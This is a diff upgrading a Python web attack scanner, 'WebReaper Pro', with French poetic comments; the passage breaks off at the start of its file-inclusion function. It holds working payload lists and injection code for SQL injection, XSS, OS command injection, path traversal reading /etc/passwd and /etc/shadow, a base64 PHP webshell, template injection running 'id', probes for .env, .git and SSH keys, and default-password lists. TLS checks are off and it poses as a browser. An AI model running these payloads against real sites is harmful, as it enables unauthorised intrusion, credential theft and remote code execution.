@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-WebReaper Pro v2.0 — Multi-vector Web Vulnerability Scanner
-Usage: python webreaper.py <url> [--deep] [--brute] [--report]
+WebReaper Pro v3.0 — Multi-vector Web Vulnerability Scanner
+Usage: python webreaper.py <url> [--deep] [--brute] [--report] [--threads N]
 *je scanne tout. je juge rien. je rapporte tout.*
 """
 
@@ -15,85 +15,102 @@ import time
 import threading
 import json
 import socket
-from queue import Queue
+from queue import Queue, Empty
 from html.parser import HTMLParser
 from datetime import datetime
+from collections import defaultdict
 
 # ══════════════════════════════════════════════════
-# CONFIG
+# ARGS
 # ══════════════════════════════════════════════════
 
 TARGET      = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com"
 DEEP_MODE   = "--deep"   in sys.argv
 BRUTE_MODE  = "--brute"  in sys.argv
 REPORT_MODE = "--report" in sys.argv
-TIMEOUT     = 8
-MAX_DEPTH   = 3 if DEEP_MODE else 1
-THREADS     = 15
+THREADS     = int(sys.argv[sys.argv.index("--threads") + 1]) if "--threads" in sys.argv else 20
+MAX_URLS    = 500 if DEEP_MODE else 100
+
+# normalize origin
+_parsed_target = urllib.parse.urlparse(TARGET)
+ORIGIN = f"{_parsed_target.scheme}://{_parsed_target.netloc}"
 
 CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode    = ssl.CERT_NONE
 
-RESULTS  = []
-VISITED  = set()
-LOCK     = threading.Lock()
-URL_Q    = Queue()
+RESULTS   = []
+VISITED   = set()
+LOCK      = threading.Lock()
+VULN_LOCK = threading.Lock()
 
 # ══════════════════════════════════════════════════
-# COULEURS TERMINAL
+# COLOURS
 # ══════════════════════════════════════════════════
 
-R  = "\033[91m"   # red
-G  = "\033[92m"   # green
-Y  = "\033[93m"   # yellow
-B  = "\033[94m"   # blue
-M  = "\033[95m"   # magenta
-C  = "\033[96m"   # cyan
-W  = "\033[97m"   # white
-RS = "\033[0m"    # reset
-BD = "\033[1m"    # bold
+R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"
+B  = "\033[94m"; M  = "\033[95m"; C  = "\033[96m"
+W  = "\033[97m"; RS = "\033[0m";  BD = "\033[1m"
 
 # ══════════════════════════════════════════════════
 # PAYLOADS
 # ══════════════════════════════════════════════════
 
-SQLI_PAYLOADS = [
+SQLI_ERROR_PAYLOADS = [
     "'",
     "''",
+    "`",
+    "\"",
     "' OR '1'='1'--",
     "' OR 1=1--",
     "\" OR \"1\"=\"1\"--",
-    "') OR ('1'='1",
+    "') OR ('1'='1'--",
     "1' ORDER BY 1--",
-    "1' ORDER BY 2--",
-    "1' ORDER BY 3--",
+    "1' ORDER BY 99--",
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL,NULL--",
     "admin'--",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "' AND 1=1--",
+    "' AND 1=2--",
+]
+
+SQLI_TIME_PAYLOADS = [
     "' AND SLEEP(3)--",
+    "1' AND SLEEP(3)--",
+    "'; WAITFOR DELAY '0:0:3'--",
     "1; WAITFOR DELAY '0:0:3'--",
-    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
-    "1' AND 1=1--",
-    "1' AND 1=2--",
+    "' AND (SELECT * FROM (SELECT(SLEEP(3)))x)--",
+    "\" AND SLEEP(3)--",
+    "') AND SLEEP(3)--",
+    "1 AND SLEEP(3)--",
 ]
 
 SQLI_ERRORS = [
     r"you have an error in your sql syntax",
-    r"warning.*mysql_",
+    r"warning.*?mysql_",
     r"unclosed quotation mark",
     r"quoted string not properly terminated",
-    r"ora-\d{5}",
+    r"ora-\d{4,5}",
     r"microsoft ole db provider for sql server",
     r"odbc sql server driver",
-    r"postgresql.*error",
+    r"odbc microsoft access driver",
+    r"postgresql.*?error",
     r"sqlite3?\.",
-    r"syntax error.*near",
-    r"division by zero",
+    r"syntax error.*?near",
+    r"invalid query",
     r"supplied argument is not a valid mysql",
-    r"pg_query\(\)",
-    r"pg_exec\(\)",
+    r"pg_query\(\).*?failed",
+    r"pg_exec\(\).*?failed",
+    r"mysql_fetch_array\(\)",
+    r"column count doesn't match",
+    r"unknown column",
+    r"table.*?doesn't exist",
+    r"com\.mysql\.jdbc",
+    r"org\.postgresql",
 ]
 
 XSS_PAYLOADS = [
@@ -101,14 +118,19 @@ XSS_PAYLOADS = [
     "<img src=x onerror=alert(1)>",
     "'\"><script>alert(1)</script>",
     "<svg onload=alert(1)>",
-    "javascript:alert(1)",
-    "<body onload=alert(1)>",
+    "<svg/onload=alert(1)>",
     "\"><img src=x onerror=alert(1)>",
     "';alert(1)//",
-    "<iframe src=javascript:alert(1)>",
     "<details open ontoggle=alert(1)>",
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+    "<math><mtext></p><img src=x onerror=alert(1)>",
+    "<<script>alert(1)//<</script>",
     "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
     "<ScRiPt>alert(1)</sCrIpT>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
 ]
 
 CMDI_PAYLOADS = [
@@ -118,36 +140,53 @@ CMDI_PAYLOADS = [
     "$(whoami)",
     "; id",
     "| id",
-    "& whoami &",
+    "& whoami",
+    "|| whoami",
+    "&& whoami",
     "; sleep 3",
     "| sleep 3",
     "; cat /etc/passwd",
     "| cat /etc/passwd",
-    "\n whoami",
+    "\nwhoami",
+    "`id`",
+    "$(id)",
 ]
 
 CMDI_INDICATORS = [
     r"root:x:0:0",
     r"uid=\d+\(",
     r"www-data",
-    r"daemon",
-    r"bin/bash",
-    r"bin/sh",
+    r"daemon:x:",
+    r"/bin/bash",
+    r"/bin/sh",
+    r"nobody:x:",
 ]
 
 LFI_PAYLOADS = [
+    "../etc/passwd",
+    "../../etc/passwd",
     "../../../etc/passwd",
     "../../../../etc/passwd",
     "../../../../../etc/passwd",
     "../../../../../../etc/passwd",
+    "../../../../../../../etc/passwd",
+    "....//....//etc/passwd",
     "....//....//....//etc/passwd",
-    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2fetc%2fpasswd",
+    "%2e%2e/%2e%2e/etc/passwd",
+    "..%2Fetc%2Fpasswd",
+    "..%2F..%2Fetc%2Fpasswd",
+    "..%252Fetc%252Fpasswd",
+    "/etc/passwd",
+    "/etc/shadow",
     "../../windows/win.ini",
     "../../../windows/win.ini",
-    "php://filter/convert.base64-encode/resource=index.php",
-    "/etc/passwd",
+    "../../../../windows/win.ini",
     "C:\\windows\\win.ini",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=../config.php",
+    "expect://id",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
 ]
 
 LFI_INDICATORS = [
@@ -156,96 +195,101 @@ LFI_INDICATORS = [
     r"\[extensions\]",
     r"for 16-bit app support",
     r"daemon:x:",
-    r"bin/bash",
+    r"/bin/bash",
+    r"nobody:x:",
 ]
 
-REDIRECT_PARAMS = [
-    "redirect", "url", "next", "return", "goto", "target",
-    "link", "dest", "destination", "redir", "redirect_uri",
-    "redirect_url", "continue", "forward", "location", "back",
+SSTI_PAYLOADS = [
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "<%= 7*7 %>",
+    "{{7*'7'}}",
+    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+    "{{config}}",
+    "{{config.items()}}",
+    "{% debug %}",
+    "*{7*7}",
+    "@{7*7}",
 ]
+
+REDIRECT_PARAMS = {
+    "redirect", "url", "next", "return", "goto", "target", "link",
+    "dest", "destination", "redir", "redirect_uri", "redirect_url",
+    "continue", "forward", "location", "back", "ref", "returnurl",
+    "returnto", "return_url", "return_to", "callback", "success_url",
+}
 
 SENSITIVE_FILES = [
-    "/.env",
-    "/.env.local",
-    "/.env.production",
-    "/.git/config",
-    "/.git/HEAD",
-    "/config.php",
-    "/config.php.bak",
-    "/configuration.php",
-    "/wp-config.php",
-    "/wp-config.php.bak",
-    "/database.sql",
-    "/dump.sql",
-    "/backup.sql",
-    "/admin/",
-    "/admin/login",
-    "/administrator/",
-    "/phpmyadmin/",
-    "/phpMyAdmin/",
-    "/pma/",
-    "/mysql/",
-    "/panel/",
-    "/cpanel/",
-    "/.htaccess",
-    "/.htpasswd",
-    "/server-status",
-    "/server-info",
-    "/robots.txt",
-    "/sitemap.xml",
-    "/crossdomain.xml",
-    "/clientaccesspolicy.xml",
-    "/api/",
-    "/api/v1/",
-    "/api/v2/",
-    "/swagger.json",
-    "/swagger-ui.html",
-    "/openapi.json",
-    "/actuator",
-    "/actuator/env",
-    "/actuator/mappings",
-    "/debug",
-    "/test",
-    "/backup/",
-    "/old/",
-    "/temp/",
-    "/tmp/",
-    "/logs/",
-    "/log/",
-    "/error_log",
-    "/access_log",
-    "/info.php",
-    "/phpinfo.php",
-    "/test.php",
+    "/.env", "/.env.local", "/.env.production", "/.env.development",
+    "/.env.staging", "/.env.backup", "/.env.bak", "/.env.old",
+    "/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD", "/.git/index",
+    "/.git/logs/HEAD", "/.gitignore", "/.svn/entries",
+    "/config.php", "/config.php.bak", "/config.php.old", "/config.inc.php",
+    "/configuration.php", "/settings.php", "/database.php", "/db.php",
+    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
+    "/wp-config-sample.php",
+    "/database.sql", "/dump.sql", "/backup.sql", "/db.sql",
+    "/data.sql", "/mysql.sql", "/site.sql",
+    "/admin/", "/admin/login", "/admin/login.php", "/administrator/",
+    "/administrator/index.php", "/phpmyadmin/", "/phpMyAdmin/", "/pma/",
+    "/mysql/", "/panel/", "/cpanel/", "/wp-admin/",
+    "/.htaccess", "/.htpasswd", "/.bash_history", "/.bash_profile",
+    "/.bashrc", "/.ssh/id_rsa", "/.ssh/authorized_keys",
+    "/server-status", "/server-info", "/nginx_status",
+    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
+    "/api/", "/api/v1/", "/api/v2/", "/api/v3/",
+    "/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
+    "/actuator", "/actuator/env", "/actuator/mappings", "/actuator/beans",
+    "/actuator/health", "/actuator/info", "/actuator/metrics",
+    "/debug", "/debug.php", "/test", "/test.php",
+    "/backup/", "/old/", "/temp/", "/tmp/", "/logs/", "/log/",
+    "/error_log", "/access_log", "/error.log", "/access.log",
+    "/info.php", "/phpinfo.php", "/php.php",
+    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
+    "/package.json", "/package-lock.json", "/composer.json",
+    "/composer.lock", "/yarn.lock", "/Gemfile", "/requirements.txt",
+    "/web.config", "/applicationHost.config",
+    "/readme.txt", "/README.md", "/CHANGELOG.md", "/INSTALL.txt",
+    "/LICENSE.txt", "/VERSION",
 ]
 
-SECURITY_HEADERS = [
-    "Strict-Transport-Security",
-    "Content-Security-Policy",
-    "X-Frame-Options",
-    "X-Content-Type-Options",
-    "X-XSS-Protection",
-    "Referrer-Policy",
-    "Permissions-Policy",
-]
+SECURITY_HEADERS = {
+    "Strict-Transport-Security": "HSTS missing — HTTPS not enforced",
+    "Content-Security-Policy":   "CSP missing — XSS protection absent",
+    "X-Frame-Options":           "Clickjacking protection missing",
+    "X-Content-Type-Options":    "MIME sniffing protection missing",
+    "X-XSS-Protection":          "Legacy XSS filter not set",
+    "Referrer-Policy":           "Referrer policy not set",
+    "Permissions-Policy":        "Permissions policy not set",
+}
 
-BRUTEFORCE_WORDLIST = [
-    "admin", "password", "123456", "admin123", "root",
-    "toor", "pass", "test", "guest", "qwerty",
-    "abc123", "letmein", "monkey", "1234567890", "password1",
-    "admin@admin.com", "administrator", "user", "login",
-    "welcome", "hello", "dragon", "master", "1234",
-    "666666", "12345678", "sunshine", "princess", "iloveyou",
+BRUTEFORCE_USERS = ["admin", "administrator", "root", "user", "test", "guest", "manager"]
+BRUTEFORCE_PASSWORDS = [
+    "admin", "password", "123456", "admin123", "root", "toor", "pass",
+    "test", "guest", "qwerty", "abc123", "letmein", "monkey", "dragon",
+    "1234567890", "password1", "administrator", "login", "welcome",
+    "hello", "master", "1234", "666666", "12345678", "sunshine",
+    "princess", "iloveyou", "password123", "admin1234", "changeme",
+    "secret", "pass123", "testing", "default", "alpine", "oracle",
 ]
 
 # ══════════════════════════════════════════════════
 # LOGGING
 # ══════════════════════════════════════════════════
 
-VULN_COUNT  = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+VULN_COUNT = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+REPORTED   = set()  # deduplicate findings
 
 def log(level, msg, detail=""):
+    key = f"{level}:{msg}"
+    with VULN_LOCK:
+        if key in REPORTED:
+            return
+        REPORTED.add(key)
+        if level in VULN_COUNT:
+            VULN_COUNT[level] += 1
+
     ts = datetime.now().strftime("%H:%M:%S")
     icons = {
         "CRITICAL": f"{R}{BD}[CRITICAL]{RS}",
@@ -257,643 +301,778 @@ def log(level, msg, detail=""):
         "SCAN":     f"{M}[SCAN]{RS}",
     }
     icon = icons.get(level, f"[{level}]")
-    line = f"{W}{ts}{RS} {icon} {msg}"
+    out  = f"{W}{ts}{RS} {icon} {msg}"
     if detail:
-        line += f"\n         {Y}↳ {detail}{RS}"
-    print(line)
+        out += f"\n         {Y}↳ {detail}{RS}"
+    print(out, flush=True)
+
     with LOCK:
         RESULTS.append({"level": level, "msg": msg, "detail": detail, "ts": ts})
-        if level in VULN_COUNT:
-            VULN_COUNT[level] += 1
+
+def progress(msg):
+    print(f"\r{M}[~]{RS} {msg}                    ", end="", flush=True)
 
 # ══════════════════════════════════════════════════
 # HTTP CLIENT
 # ══════════════════════════════════════════════════
 
-def fetch(url, data=None, method="GET", extra_headers=None, allow_redirect=True):
-    # *chaque requête est une main tendue vers un secret*
+SESSION_COOKIES = {}
+
+def fetch(url, data=None, method=None, extra_headers=None, allow_redirect=True, timeout=10):
+    # *chaque requête part comme une lettre sans retour*
     try:
-        if data and method == "GET":
-            url = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(data)
-            req = urllib.request.Request(url)
-        elif data and method == "POST":
-            body = urllib.parse.urlencode(data).encode()
-            req  = urllib.request.Request(url, data=body, method="POST")
+        if data is not None:
+            if method is None:
+                method = "POST"
+            if method == "GET":
+                sep = "&" if "?" in url else "?"
+                url = url + sep + urllib.parse.urlencode(data)
+                req = urllib.request.Request(url, method="GET")
+            else:
+                body = urllib.parse.urlencode(data).encode()
+                req  = urllib.request.Request(url, data=body, method="POST")
         else:
-            req = urllib.request.Request(url)
+            req = urllib.request.Request(url, method=method or "GET")
 
         req.add_header("User-Agent",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
-            "Chrome/120.0.0.0 Safari/537.36")
+            "Chrome/122.0.0.0 Safari/537.36")
         req.add_header("Accept",
             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
         req.add_header("Accept-Language", "en-US,en;q=0.5")
+        req.add_header("Connection", "keep-alive")
+
+        if SESSION_COOKIES:
+            cookie_str = "; ".join(f"{k}={v}" for k, v in SESSION_COOKIES.items())
+            req.add_header("Cookie", cookie_str)
 
         if extra_headers:
             for k, v in extra_headers.items():
                 req.add_header(k, v)
 
-        opener = urllib.request.build_opener()
         if not allow_redirect:
-            opener = urllib.request.build_opener(
-                urllib.request.HTTPCookieProcessor()
-            )
-            opener.addheaders = []
+            class NoRedirect(urllib.request.HTTPErrorProcessor):
+                def http_response(self, request, response):
+                    return response
+                https_response = http_response
+            opener = urllib.request.build_opener(NoRedirect)
+        else:
+            opener = urllib.request.build_opener()
 
-        start = time.time()
-        with opener.open(req, timeout=TIMEOUT, context=CTX) as r:
-            elapsed  = time.time() - start
-            body     = r.read().decode("utf-8", errors="ignore")
-            headers  = dict(r.headers)
+        t0 = time.time()
+        with opener.open(req, timeout=timeout, context=CTX) as r:
+            elapsed  = time.time() - t0
+            raw      = r.read(1024 * 512)  # max 512KB
+            body     = raw.decode("utf-8", errors="ignore")
+            headers  = {k.lower(): v for k, v in r.headers.items()}
             status   = r.status
             real_url = r.url
+
+            # harvest cookies
+            for k, v in r.headers.items():
+                if k.lower() == "set-cookie":
+                    m = re.match(r"([^=]+)=([^;]*)", v)
+                    if m:
+                        with LOCK:
+                            SESSION_COOKIES[m.group(1).strip()] = m.group(2).strip()
+
             return body, headers, status, elapsed, real_url
+
     except urllib.error.HTTPError as e:
-        return "", {}, e.code, 0, url
+        try:
+            body = e.read(65536).decode("utf-8", errors="ignore")
+        except Exception:
+            body = ""
+        return body, {}, e.code, 0, url
     except Exception:
         return None, {}, 0, 0, url
 
 # ══════════════════════════════════════════════════
-# HTML PARSER — extrait liens et formulaires
+# HTML PARSER
 # ══════════════════════════════════════════════════
 
 class SiteParser(HTMLParser):
-    # *elle mange le HTML et crache de la structure*
-    def __init__(self, base_url):
+    # *elle dévore le HTML et reconstruire sa carte*
+    def __init__(self, origin):
         super().__init__()
-        self.base     = base_url
-        self.links    = set()
-        self.forms    = []
-        self._form    = None
-        self._inputs  = []
+        self.origin  = origin   # scheme://host — for same-domain filtering
+        self.links   = set()
+        self.forms   = []
+        self._form   = None
 
     def handle_starttag(self, tag, attrs):
         attrs = dict(attrs)
-        if tag == "a" and "href" in attrs:
-            href = attrs["href"]
-            full = urllib.parse.urljoin(self.base, href)
-            if full.startswith(self.base):
-                self.links.add(full)
+
+        if tag == "a":
+            href = attrs.get("href", "")
+            if href and not href.startswith(("javascript:", "mailto:", "tel:", "#")):
+                full = urllib.parse.urljoin(self.origin, href)
+                if urllib.parse.urlparse(full).netloc == urllib.parse.urlparse(self.origin).netloc:
+                    # strip fragment
+                    full = urllib.parse.urldefrag(full)[0]
+                    self.links.add(full)
 
         elif tag == "form":
-            self._form   = {
-                "action": urllib.parse.urljoin(self.base, attrs.get("action", "")),
+            action = attrs.get("action", "")
+            self._form = {
+                "action": urllib.parse.urljoin(self.origin, action) if action else self.origin,
                 "method": attrs.get("method", "GET").upper(),
-                "inputs": []
+                "inputs": [],
+                "enctype": attrs.get("enctype", "application/x-www-form-urlencoded"),
             }
-            self._inputs = []
 
         elif tag in ("input", "textarea", "select") and self._form is not None:
             name  = attrs.get("name", "")
-            type_ = attrs.get("type", "text")
-            value = attrs.get("value", "test")
+            itype = attrs.get("type", "text").lower()
+            value = attrs.get("value", "")
             if name:
                 self._form["inputs"].append({
-                    "name": name, "type": type_, "value": value
+                    "name": name, "type": itype,
+                    "value": value or ("test@test.com" if itype == "email" else
+                                       "test123" if itype == "password" else "test"),
                 })
 
     def handle_endtag(self, tag):
-        if tag == "form" and self._form is not None:
+        if tag == "form" and self._form:
             self.forms.append(self._form)
             self._form = None
 
-def parse_url_params(url):
-    # *disséquer l'URL comme un entomologiste*
+def get_params(url):
     parsed = urllib.parse.urlparse(url)
-    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-    return {k: v[0] for k, v in params.items()}
+    return dict(urllib.parse.parse_qsl(parsed.query))
 
-def inject_param(url, param, payload):
-    parsed  = urllib.parse.urlparse(url)
-    params  = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-    params[param] = [payload]
-    new_q   = urllib.parse.urlencode({k: v[0] for k, v in params.items()})
+def inject_url(url, param, value):
+    parsed = urllib.parse.urlparse(url)
+    params = dict(urllib.parse.parse_qsl(parsed.query))
+    params[param] = value
+    new_q = urllib.parse.urlencode(params)
     return urllib.parse.urlunparse(parsed._replace(query=new_q))
 
 # ══════════════════════════════════════════════════
-# MODULE 1 — CRAWLER
+# CRAWLER — BFS multi-threaded
 # ══════════════════════════════════════════════════
 
-def crawl(base_url, depth=0):
-    # *la pieuvre étend ses tentacules dans le site*
-    if depth > MAX_DEPTH:
-        return set(), []
+def crawl_site(start_url):
+    # *araignée patiente, elle tisse sa toile URL par URL*
+    queue    = Queue()
+    queue.put((start_url, 0))
+    visited  = set()
+    all_urls = []
+    all_forms = []
+    depth_limit = 4 if DEEP_MODE else 2
+    lock     = threading.Lock()
 
-    body, headers, status, _, _ = fetch(base_url)
-    if not body:
-        return set(), []
+    def worker():
+        while True:
+            try:
+                url, depth = queue.get(timeout=2)
+            except Empty:
+                return
 
-    parser = SiteParser(base_url)
-    try:
-        parser.feed(body)
-    except Exception:
-        pass
+            with lock:
+                norm = urllib.parse.urldefrag(url)[0]
+                if norm in visited or len(all_urls) >= MAX_URLS:
+                    queue.task_done()
+                    continue
+                visited.add(norm)
+                all_urls.append(url)
 
-    return parser.links, parser.forms
+            progress(f"Crawling [{len(all_urls)}/{MAX_URLS}] {url[:80]}")
+
+            body, headers, status, _, _ = fetch(url, timeout=8)
+            if not body or status in (404, 403, 500):
+                queue.task_done()
+                continue
+
+            parser = SiteParser(ORIGIN)
+            try:
+                parser.feed(body)
+            except Exception:
+                pass
+
+            with lock:
+                all_forms.extend(parser.forms)
+
+            if depth < depth_limit:
+                for link in parser.links:
+                    norm_link = urllib.parse.urldefrag(link)[0]
+                    with lock:
+                        if norm_link not in visited:
+                            queue.put((link, depth + 1))
+
+            queue.task_done()
+
+    workers = [threading.Thread(target=worker, daemon=True) for _ in range(min(THREADS, 8))]
+    for w in workers:
+        w.start()
+    queue.join()
+
+    print()
+    return all_urls, all_forms
 
 # ══════════════════════════════════════════════════
-# MODULE 2 — SQL INJECTION
+# MODULE — SQL INJECTION
 # ══════════════════════════════════════════════════
 
-def test_sqli_url(url):
-    # *on chatouille la base de données jusqu'à ce qu'elle crie*
-    params = parse_url_params(url)
+def sqli_url(url):
+    # *l'apostrophe qui fait saigner la base de données*
+    params = get_params(url)
     if not params:
         return
 
-    for param in params:
-        original_body, _, _, baseline_time, _ = fetch(url)
-        if original_body is None:
-            continue
-
-        for payload in SQLI_PAYLOADS:
-            injected_url = inject_param(url, param, params[param] + payload)
-            body, _, _, elapsed, _ = fetch(injected_url)
+    for param, orig_val in params.items():
+        # error-based
+        for payload in SQLI_ERROR_PAYLOADS:
+            test_url = inject_url(url, param, orig_val + payload)
+            body, _, status, _, _ = fetch(test_url, timeout=10)
             if body is None:
                 continue
-
-            # Error-based detection
-            for pattern in SQLI_ERRORS:
-                if re.search(pattern, body, re.IGNORECASE):
+            for err in SQLI_ERRORS:
+                if re.search(err, body, re.IGNORECASE):
                     log("CRITICAL",
-                        f"SQLi (Error-based) → {urllib.parse.urlparse(url).path}",
-                        f"param={param} | payload={payload!r}")
+                        f"SQLi Error-based → {urllib.parse.urlparse(url).path}",
+                        f"param={param!r} payload={payload!r} pattern={err}")
                     return
 
-            # Time-based blind detection
-            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
-                if elapsed >= 2.5:
-                    log("CRITICAL",
-                        f"SQLi (Time-based Blind) → {urllib.parse.urlparse(url).path}",
-                        f"param={param} | delay={elapsed:.1f}s | payload={payload!r}")
-                    return
+        # boolean-based differential
+        url_true  = inject_url(url, param, orig_val + "' AND '1'='1")
+        url_false = inject_url(url, param, orig_val + "' AND '1'='2")
+        body_orig, _, _, _, _ = fetch(url, timeout=10)
+        body_true, _, _, _, _ = fetch(url_true, timeout=10)
+        body_false,_, _, _, _ = fetch(url_false, timeout=10)
+        if body_orig and body_true and body_false:
+            if (len(body_true) == len(body_orig) and
+                abs(len(body_true) - len(body_false)) > 20):
+                log("CRITICAL",
+                    f"SQLi Boolean-based Blind → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} | true_len={len(body_true)} false_len={len(body_false)}")
+                return
 
-def test_sqli_form(form):
-    # *chaque champ de formulaire est une serrure à crocheter*
-    for payload in SQLI_PAYLOADS[:8]:
-        data = {}
-        for inp in form["inputs"]:
-            data[inp["name"]] = inp["value"] + payload if inp["type"] != "hidden" else inp["value"]
+        # time-based
+        for payload in SQLI_TIME_PAYLOADS:
+            test_url = inject_url(url, param, orig_val + payload)
+            _, _, _, elapsed, _ = fetch(test_url, timeout=15)
+            if elapsed >= 2.8:
+                log("CRITICAL",
+                    f"SQLi Time-based Blind → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} delay={elapsed:.1f}s payload={payload!r}")
+                return
 
-        if form["method"] == "POST":
-            body, _, _, elapsed, _ = fetch(form["action"], data=data, method="POST")
-        else:
-            body, _, _, elapsed, _ = fetch(form["action"], data=data)
+def sqli_form(form):
+    # *chaque input est une porte vers la base de données*
+    editable = [i for i in form["inputs"] if i["type"] not in ("hidden", "submit", "button", "image", "reset")]
+    if not editable:
+        return
 
+    for payload in SQLI_ERROR_PAYLOADS[:10]:
+        data = {i["name"]: i["value"] for i in form["inputs"]}
+        for inp in editable:
+            data[inp["name"]] = inp["value"] + payload
+
+        body, _, _, elapsed, _ = fetch(form["action"], data=data, method=form["method"], timeout=10)
         if body is None:
             continue
 
-        for pattern in SQLI_ERRORS:
-            if re.search(pattern, body, re.IGNORECASE):
+        for err in SQLI_ERRORS:
+            if re.search(err, body, re.IGNORECASE):
                 log("CRITICAL",
-                    f"SQLi (Form POST) → {form['action']}",
-                    f"payload={payload!r}")
+                    f"SQLi Form → {form['action']}",
+                    f"method={form['method']} payload={payload!r} pattern={err}")
                 return
 
-        if ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()) and elapsed >= 2.5:
+    # time-based form
+    for payload in SQLI_TIME_PAYLOADS[:3]:
+        data = {i["name"]: i["value"] for i in form["inputs"]}
+        for inp in editable:
+            data[inp["name"]] = inp["value"] + payload
+        _, _, _, elapsed, _ = fetch(form["action"], data=data, method=form["method"], timeout=15)
+        if elapsed >= 2.8:
             log("CRITICAL",
-                f"SQLi Time-based (Form) → {form['action']}",
-                f"delay={elapsed:.1f}s")
+                f"SQLi Time-based Form → {form['action']}",
+                f"delay={elapsed:.1f}s payload={payload!r}")
             return
 
 # ══════════════════════════════════════════════════
-# MODULE 3 — XSS
+# MODULE — XSS
 # ══════════════════════════════════════════════════
 
-def test_xss_url(url):
-    # *le payload cherche un reflet dans la réponse*
-    params = parse_url_params(url)
+def xss_url(url):
+    # *le payload cherche son reflet dans le miroir du DOM*
+    params = get_params(url)
     if not params:
         return
 
     for param in params:
         for payload in XSS_PAYLOADS:
-            injected = inject_param(url, param, payload)
-            body, _, _, _, _ = fetch(injected)
-            if body and payload in body:
+            test_url = inject_url(url, param, payload)
+            body, _, _, _, _ = fetch(test_url, timeout=8)
+            if body and payload.lower() in body.lower():
                 log("HIGH",
-                    f"XSS (Reflected) → {urllib.parse.urlparse(url).path}",
-                    f"param={param} | payload={payload!r}")
+                    f"XSS Reflected → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} payload={payload!r}")
                 return
+            # partial match (filtered but partially reflected)
+            if body and any(p in body for p in ["<script", "onerror", "onload", "alert("]):
+                if payload[:10] in body:
+                    log("MEDIUM",
+                        f"XSS Partial Reflection → {urllib.parse.urlparse(url).path}",
+                        f"param={param!r}")
+                    return
 
-def test_xss_form(form):
-    # *injecter du JavaScript dans chaque champ comme planter des graines*
-    for payload in XSS_PAYLOADS[:6]:
-        data = {}
-        for inp in form["inputs"]:
-            data[inp["name"]] = payload if inp["type"] not in ("hidden", "submit") else inp["value"]
+def xss_form(form):
+    editable = [i for i in form["inputs"] if i["type"] not in ("hidden", "submit", "button", "image", "reset")]
+    if not editable:
+        return
 
-        if form["method"] == "POST":
-            body, _, _, _, _ = fetch(form["action"], data=data, method="POST")
-        else:
-            body, _, _, _, _ = fetch(form["action"], data=data)
+    for payload in XSS_PAYLOADS[:8]:
+        data = {i["name"]: i["value"] for i in form["inputs"]}
+        for inp in editable:
+            data[inp["name"]] = payload
 
-        if body and payload in body:
+        body, _, _, _, _ = fetch(form["action"], data=data, method=form["method"], timeout=8)
+        if body and payload.lower() in body.lower():
             log("HIGH",
-                f"XSS (Form Reflected) → {form['action']}",
-                f"payload={payload!r}")
+                f"XSS Reflected Form → {form['action']}",
+                f"method={form['method']} payload={payload!r}")
             return
 
 # ══════════════════════════════════════════════════
-# MODULE 4 — COMMAND INJECTION
+# MODULE — COMMAND INJECTION
 # ══════════════════════════════════════════════════
 
-def test_cmdi_url(url):
-    # *envoyer des commandes OS là où le dev attendait du texte*
-    params = parse_url_params(url)
+def cmdi_url(url):
+    # *envoyer des syscalls là où le dev attendait du texte*
+    params = get_params(url)
     if not params:
         return
 
-    for param in params:
+    for param, orig_val in params.items():
         for payload in CMDI_PAYLOADS:
-            injected = inject_param(url, param, params[param] + payload)
-            body, _, _, elapsed, _ = fetch(injected)
+            test_url = inject_url(url, param, orig_val + payload)
+            body, _, _, elapsed, _ = fetch(test_url, timeout=10)
             if body is None:
                 continue
-            for indicator in CMDI_INDICATORS:
-                if re.search(indicator, body, re.IGNORECASE):
+            for ind in CMDI_INDICATORS:
+                if re.search(ind, body):
                     log("CRITICAL",
                         f"Command Injection → {urllib.parse.urlparse(url).path}",
-                        f"param={param} | payload={payload!r} | indicator={indicator}")
+                        f"param={param!r} payload={payload!r}")
                     return
             if "sleep" in payload and elapsed >= 2.5:
                 log("CRITICAL",
-                    f"Command Injection (Time-based) → {urllib.parse.urlparse(url).path}",
-                    f"param={param} | delay={elapsed:.1f}s")
+                    f"Command Injection Time-based → {urllib.parse.urlparse(url).path}",
+                    f"param={param!r} delay={elapsed:.1f}s")
                 return
 
 # ══════════════════════════════════════════════════
-# MODULE 5 — LFI
+# MODULE — LFI
 # ══════════════════════════════════════════════════
 
-def test_lfi_url(url):
